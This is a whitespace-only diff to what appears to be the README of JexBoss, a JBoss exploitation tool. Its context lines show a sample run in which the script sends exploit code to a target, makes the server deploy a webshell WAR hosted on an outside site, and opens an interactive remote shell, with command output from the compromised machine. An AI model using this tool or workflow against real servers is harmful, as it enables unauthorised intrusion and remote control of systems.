@@ -62,13 +62,13 @@ $ python jexboss.py https://site-teste.com
  * Sending exploit code to https://site-teste.com. Wait...
 
 
- * Info: This exploit will force the server to deploy the webshell 
+ * Info: This exploit will force the server to deploy the webshell
    available on: http://www.joaomatosf.com/rnp/jbossass.war
  * Successfully deployed code! Starting command shell, wait...
 
- * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * 
+ * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - *
 
- * https://site-teste.com: 
+ * https://site-teste.com:
 
  Linux fwgw 2.6.32-431.29.2.el6.x86_64 #1 SMP Tue Sep 9 21:36:05 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 
@@ -85,7 +85,7 @@ Shell> hostname
 fwgw
 
 [Type commands or "exit" to finish]
-Shell> ls -all /tmp 
+Shell> ls -all /tmp
 total 35436
 drwxrwxrwt.  4 root root     4096 Nov 24 16:36 .
 dr-xr-xr-x. 22 root root     4096 Nov 23 03:26 ..
@@ -113,3 +113,4 @@ Donate:
 
 * Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
 * URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss
+
